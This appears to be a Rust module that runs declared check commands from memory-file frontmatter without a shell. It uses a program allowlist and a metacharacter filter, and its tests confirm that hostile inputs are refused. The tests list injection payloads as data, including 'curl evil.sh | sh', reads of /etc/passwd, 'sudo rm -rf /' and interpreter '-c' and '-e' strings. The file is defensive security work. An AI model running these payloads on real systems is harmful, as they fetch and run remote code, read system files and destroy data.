use once_cell::sync::Lazy;
use regex::Regex;
use std::io::Read;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::thread;
use std::time::{Duration, Instant};

static SHELL_META: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"[;&|`$><\n\r\\]|\$\(|\|\||&&"#).unwrap());

static ARGV_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r#""([^"]*)"|'([^']*)'|(\S+)"#).unwrap());

/// Splits a command line into argv, honouring quotes. No shell involved.
pub fn to_argv(line: &str) -> Vec<String> {
    ARGV_RE
        .captures_iter(line)
        .filter_map(|c| c.get(1).or_else(|| c.get(2)).or_else(|| c.get(3)))
        .map(|m| m.as_str().to_string())
        .collect()
}

/// A line safe to run is one carrying no shell metacharacter: a value read
/// from a data file cannot chain, redirect or substitute its way into
/// something else if it never reaches a shell in the first place.
/// Programs a declared check may run. Refusing shell syntax is not enough on
/// its own: `sh -c "..."` carries no metacharacter and still hands the whole
/// line to a shell, so the program itself has to be vouched for. Everything
/// here reads state without changing it.
const ALLOWED: &[&str] = &[
    "git", "grep", "egrep", "fgrep", "rg", "cat", "head", "tail", "ls", "wc", "stat", "file",
    "jq", "kubectl", "docker", "plutil", "uname", "sw_vers", "date", "echo", "test", "true",
    "false", "dirname", "basename", "realpath", "readlink", "printenv", "which", "sort", "uniq",
    "cut", "tr", "diff", "cmp", "md5", "shasum", "curl",
];

/// The program part of a declared command, without its directory.
pub fn program_of(line: &str) -> Option<String> {
    let argv = to_argv(line);
    let first = argv.first()?;
    Some(first.rsplit('/').next().unwrap_or(first).to_string())
}

pub fn is_allowed_program(line: &str) -> bool {
    program_of(line).map(|p| ALLOWED.contains(&p.as_str())).unwrap_or(false)
}

pub fn is_safe(line: &str) -> bool {
    !SHELL_META.is_match(line)
}

/// Options for `run_declared_with`. Mirrors the JS `{ timeout, cwd }` object.
pub struct RunOptions {
    pub timeout_ms: u64,
    pub cwd: Option<PathBuf>,
}

impl Default for RunOptions {
    fn default() -> Self {
        Self { timeout_ms: 30_000, cwd: None }
    }
}

/// Result of a declared command run: whether it ran, whether it was refused
/// outright, and whatever it printed (or the reason it did not run).
pub struct ExecResult {
    pub ok: bool,
    pub refused: bool,
    pub output: String,
}

fn truncate(s: &str, max_chars: usize) -> String {
    s.chars().take(max_chars).collect()
}

pub(crate) struct SpawnOutcome {
    pub status: Option<std::process::ExitStatus>,
    pub stdout: Vec<u8>,
    pub stderr: Vec<u8>,
    pub timed_out: bool,
}

/// Spawns `command`, always with piped stdio and no shell, and enforces
/// `timeout_ms` by polling and killing on deadline instead of blocking
/// forever. `Command` has no native timeout, so this is that timeout.
pub(crate) fn spawn_with_timeout(
    mut command: Command,
    timeout_ms: u64,
) -> std::io::Result<SpawnOutcome> {
    command.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = command.spawn()?;
    let mut stdout = child.stdout.take().expect("stdout piped");
    let mut stderr = child.stderr.take().expect("stderr piped");

    let stdout_handle = thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = stdout.read_to_end(&mut buf);
        buf
    });
    let stderr_handle = thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = stderr.read_to_end(&mut buf);
        buf
    });

    let deadline = Instant::now() + Duration::from_millis(timeout_ms);
    let mut timed_out = false;
    let status = loop {
        match child.try_wait()? {
            Some(s) => break Some(s),
            None => {
                if Instant::now() >= deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    timed_out = true;
                    break None;
                }
                thread::sleep(Duration::from_millis(15));
            }
        }
    };

    let stdout_buf = stdout_handle.join().unwrap_or_default();
    let stderr_buf = stderr_handle.join().unwrap_or_default();
    Ok(SpawnOutcome { status, stdout: stdout_buf, stderr: stderr_buf, timed_out })
}

/// Runs a declared command with no shell, so a value read from a data file
/// cannot chain, redirect or substitute its way into something else. This is
/// the fix for a critical RCE: a `verify:` field from memory frontmatter used
/// to reach `/bin/sh -c`, so any `.md` in the memory folder became runnable
/// code that could pass its own check while doing something else entirely.
pub fn run_declared(line: &str) -> ExecResult {
    run_declared_with(line, &RunOptions::default())
}

pub fn run_declared_with(line: &str, opts: &RunOptions) -> ExecResult {
    if !is_allowed_program(line) {
        return ExecResult {
            ok: false,
            refused: true,
            output: format!(
                "programa nao permitido em verify: {}",
                program_of(line).unwrap_or_else(|| "vazio".into())
            ),
        };
    }
    if !is_safe(line) {
        return ExecResult { ok: false, refused: true, output: "usa sintaxe de shell".into() };
    }
    let argv = to_argv(line);
    let Some(program) = argv.first() else {
        return ExecResult { ok: false, refused: true, output: "vazio".into() };
    };

    let mut command = Command::new(program);
    command.args(&argv[1..]);
    if let Some(cwd) = &opts.cwd {
        command.current_dir(cwd);
    }

    let outcome = match spawn_with_timeout(command, opts.timeout_ms) {
        Ok(o) => o,
        Err(e) => return ExecResult { ok: false, refused: false, output: truncate(&e.to_string(), 200) },
    };

    if outcome.timed_out {
        let msg = format!("timeout apos {}ms", opts.timeout_ms);
        return ExecResult { ok: false, refused: false, output: truncate(&msg, 200) };
    }

    let status = outcome.status.expect("status present when not timed out");
    if status.success() {
        let output = String::from_utf8_lossy(&outcome.stdout).into_owned();
        return ExecResult { ok: true, refused: false, output };
    }

    let stdout = String::from_utf8_lossy(&outcome.stdout);
    let output = if !stdout.is_empty() {
        stdout.into_owned()
    } else {
        format!("comando falhou: codigo {:?}", status.code())
    };
    ExecResult { ok: false, refused: false, output: truncate(&output, 200) }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn recusa_sintaxe_de_shell_vinda_de_arquivo_de_dado() {
        for evil in [
            "id > /tmp/pwned; echo PWNED",
            "echo ok && curl evil.sh | sh",
            "echo $(whoami)",
            "cat /etc/passwd | head -1",
            "echo `id`",
        ] {
            assert!(!is_safe(evil), "deveria recusar: {evil}");
        }
    }

    #[test]
    fn comando_declarado_sem_metacaractere_passa() {
        assert!(is_safe("git rev-parse HEAD"));
        assert_eq!(
            to_argv(r#"grep -c "foo bar" file.txt"#),
            vec!["grep", "-c", "foo bar", "file.txt"]
        );
    }

    #[test]
    fn payload_do_pentest_nao_executa() {
        let r = run_declared("id > /tmp/bilro_test_pwned; echo PWNED");
        assert!(r.refused);
        assert!(!r.ok);
    }

    #[test]
    fn execucao_real_acontece_sem_shell() {
        let r = run_declared("echo hello");
        assert!(r.ok);
        assert!(r.output.contains("hello"));
    }
}

#[cfg(test)]
mod adversarial {
    use super::*;

    #[test]
    fn nenhum_payload_hostil_executa() {
        let marcador = "/tmp/bilro_adv_probe";
        let _ = std::fs::remove_file(marcador);
        let payloads = [
            "id > /tmp/bilro_adv_probe; echo PWNED",
            "echo ok && touch /tmp/bilro_adv_probe",
            "echo ok || touch /tmp/bilro_adv_probe",
            "echo $(touch /tmp/bilro_adv_probe)",
            "echo `touch /tmp/bilro_adv_probe`",
            "cat /etc/passwd | tee /tmp/bilro_adv_probe",
            "echo ok\ntouch /tmp/bilro_adv_probe",
            "echo ok\rtouch /tmp/bilro_adv_probe",
            "sh -c \"touch /tmp/bilro_adv_probe\"",
            "echo ok > /tmp/bilro_adv_probe",
            "echo ok & touch /tmp/bilro_adv_probe",
        ];
        let mut executados = Vec::new();
        for p in payloads {
            let r = run_declared(p);
            if !r.refused {
                executados.push(p);
            }
        }
        let vazou = std::path::Path::new(marcador).exists();
        let _ = std::fs::remove_file(marcador);
        assert!(executados.is_empty() && !vazou, "NAO RECUSOU: {executados:?} | criou arquivo: {vazou}");
    }

    #[test]
    fn interpretador_como_programa_e_recusado_mesmo_sem_metacaractere() {
        for linha in [
            "sh -c \"touch /tmp/x\"",
            "bash -c \"touch /tmp/x\"",
            "/bin/sh -c \"touch /tmp/x\"",
            "zsh -c \"touch /tmp/x\"",
            "python3 -c \"open('/tmp/x','w')\"",
            "node -e \"require('fs').writeFileSync('/tmp/x','')\"",
            "perl -e \"open F,'>','/tmp/x'\"",
            "ruby -e \"File.write('/tmp/x','')\"",
            "env touch /tmp/x",
            "xargs touch",
            "sudo rm -rf /",
            "awk \"BEGIN{system(1)}\"",
            "find . -exec touch /tmp/x ;",
        ] {
            let r = run_declared(linha);
            assert!(r.refused, "deveria recusar: {linha}");
        }
    }

    #[test]
    fn verificacao_legitima_continua_permitida() {
        for linha in ["git rev-parse HEAD", "grep -c foo Cargo.toml", "cat Cargo.toml", "kubectl get pods"] {
            assert!(is_allowed_program(linha), "deveria permitir: {linha}");
        }
    }

    #[test]
    fn comando_legitimo_ainda_roda() {
        let r = run_declared("echo bilro");
        assert!(!r.refused);
        assert!(r.ok);
        assert!(r.output.contains("bilro"));
    }
}
